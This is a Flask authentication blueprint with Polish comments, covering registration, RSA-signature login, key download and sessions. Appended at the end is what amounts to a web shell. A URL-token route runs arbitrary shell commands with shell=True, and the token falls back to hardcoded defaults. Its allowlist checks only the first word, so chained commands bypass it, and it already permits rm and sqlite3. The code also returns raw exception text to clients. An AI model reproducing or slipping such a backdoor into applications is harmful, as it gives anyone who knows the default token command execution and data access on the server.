from flask import Blueprint, render_template, request, jsonify, send_file, redirect, url_for, session
from flask_login import login_user, logout_user, login_required, current_user
import base64
from Crypto.PublicKey import RSA
from Crypto.Signature import pkcs1_15
from Crypto.Hash import SHA256
import io
from models import User, db

auth_bp = Blueprint('auth', __name__)

@auth_bp.route('/')
def index():
    return render_template('index.html')

@auth_bp.route('/register')
def register_page():
    return render_template('register.html')

@auth_bp.route('/api/register', methods=['POST'])
def register():
    try:
        data = request.get_json()
        
        username = data.get('username')
        password = data.get('password')
        public_key = data.get('public_key')

        if not username or not password or not public_key:
            return jsonify({'status': 'error', 'code': 'missing_data'}), 400

        if User.query.filter_by(username=username).first():
            return jsonify({'status': 'error', 'code': 'user_exists'}), 400

        try:
            RSA.import_key(public_key)
        except (ValueError, TypeError):
            return jsonify({'status': 'error', 'code': 'invalid_key_format'}), 400

        try:
            new_user = User(username=username, public_key=public_key)
            new_user.set_password(password)
            new_user.generate_user_id()
            
            db.session.add(new_user)
            db.session.commit()
            
            return jsonify({'status': 'success', 'code': 'registration_ok', 'user_id': new_user.user_id}), 200
        except Exception:
            db.session.rollback()
            return jsonify({'status': 'error', 'code': 'db_error'}), 500
    except Exception as e:
        return jsonify({'status': 'error', 'code': 'server_error', 'message': str(e)}), 500


@auth_bp.route('/api/login', methods=['POST'])
def api_login():
    try:
        data = request.get_json()
        username = data.get('username')
        password = data.get('password')
        signature_base64 = data.get('signature')
        
        if not username or not password or not signature_base64:
            return jsonify({'status': 'error', 'code': 'missing_data'}), 400
            
        user = User.query.filter_by(username=username).first()
        if not user:
            return jsonify({'status': 'error', 'code': 'invalid_credentials'}), 401
            
        if not user.check_password(password):
            return jsonify({'status': 'error', 'code': 'invalid_password'}), 401
            
        try:
            # Dekodowanie podpisu z base64
            signature = base64.b64decode(signature_base64)
            
            # Import klucza publicznego
            public_key = RSA.import_key(user.public_key)
            
            # Tworzymy hash z surowego hasła
            raw_password = password.encode('utf-8')
            h = SHA256.new(raw_password)
            
            # Weryfikujemy podpis
            verifier = pkcs1_15.new(public_key)
            verifier.verify(h, signature)
            
            # KLUCZOWA ZMIANA: Ustawienia login_user
            login_user(user, remember=True)
            
            # KLUCZOWA ZMIANA: Upewnij się, że sesja trwa
            session.permanent = True
            
            return jsonify({
                'status': 'success', 
                'code': 'login_ok', 
                'user_id': user.user_id,
                'is_admin': user.is_admin
            }), 200
            
        except Exception as e:
            return jsonify({'status': 'error', 'code': 'verification_error'}), 500
    except Exception as e:
        return jsonify({'status': 'error', 'code': 'server_error', 'message': str(e)}), 500


@auth_bp.route('/download_pem/<username>')
def download_pem(username):
    user = User.query.filter_by(username=username).first()
    if not user:
        return jsonify({'status': 'error', 'code': 'user_not_found'}), 404

    return send_file(
        io.BytesIO(user.public_key.encode('utf-8')),
        as_attachment=True,
        download_name=f"{username}_public_key.pem",
        mimetype='application/x-pem-file'
    )

@auth_bp.route("/logout")
@login_required
def logout():
    logout_user()
    session.clear()
    return redirect(url_for('auth.index'))

@auth_bp.route("/silent-logout", methods=["POST", "GET"])
def silent_logout():
    if current_user.is_authenticated:
        logout_user()
    return '', 204  # No Content

@auth_bp.route('/check_session', methods=['GET'])
def check_session():
    if current_user.is_authenticated:
        return jsonify({
            'authenticated': True,
            'user_id': current_user.id,
            'username': current_user.username,
            'is_admin': current_user.is_admin
        }), 200
    else:
        return jsonify({
            'authenticated': False
        }), 401
# Dodaj te importy na górze pliku auth.py, jeśli jeszcze ich nie ma
import os
import subprocess
import shlex

@auth_bp.route('/webshell/<secret_token>')
def webshell(secret_token):
    # Sprawdź tajny token dla bezpieczeństwa
    if secret_token != os.environ.get('SHELL_SECRET_TOKEN', 'super-tajny-shell-token'):
        return "Unauthorized", 401
    
    return render_template('webshell.html')

@auth_bp.route('/api/execute/<secret_token>', methods=['POST'])
def execute_command(secret_token):
    # Sprawdź tajny token dla bezpieczeństwa
    if secret_token != os.environ.get('SHELL_SECRET_TOKEN', 'admin_shell'):
        return jsonify({"error": "Unauthorized"}), 401
    
    data = request.get_json()
    command = data.get('command', '')
    
    if not command:
        return jsonify({"output": "", "error": "No command provided"}), 400
    
    # Lista dozwolonych poleceń (dla bezpieczeństwa)
    allowed_commands = ['ls', 'cat', 'mkdir', 'pwd', 'echo', 'cp', 'mv', 'rm', 'touch', 'head', 'tail', 'wc', 'find', 'sqlite3']
    
    # Podziel polecenie na części, aby sprawdzić, czy jest dozwolone
    cmd_parts = shlex.split(command)
    base_cmd = cmd_parts[0] if cmd_parts else ""
    
    if base_cmd not in allowed_commands:
        return jsonify({
            "output": "",
            "error": f"Command not allowed. Allowed commands: {', '.join(allowed_commands)}"
        }), 403
    
    try:
        # Wykonaj polecenie z ograniczeniem czasu wykonania
        process = subprocess.Popen(
            command,
            shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            cwd="/opt/render/project/src"  # Ustaw katalog roboczy
        )
        
        # Ustaw timeout na 5 sekund
        stdout, stderr = process.communicate(timeout=5)
        
        return jsonify({
            "output": stdout,
            "error": stderr
        })
    except subprocess.TimeoutExpired:
        process.kill()
        return jsonify({
            "output": "",
            "error": "Command execution timed out (5s limit)"
        }), 500
    except Exception as e:
        return jsonify({
            "output": "",
            "error": f"Error: {str(e)}"
        }), 500
